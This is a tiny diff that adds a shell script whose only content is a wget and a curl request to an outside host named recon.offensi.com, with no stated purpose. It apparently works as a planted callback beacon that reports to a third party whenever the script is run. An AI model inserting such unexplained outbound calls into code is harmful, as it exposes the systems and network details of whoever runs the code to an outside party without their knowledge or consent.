@@ -1,0 +1,3 @@
+#!/bin/sh
+wget recon.offensi.com
+curl recon.offensi.com
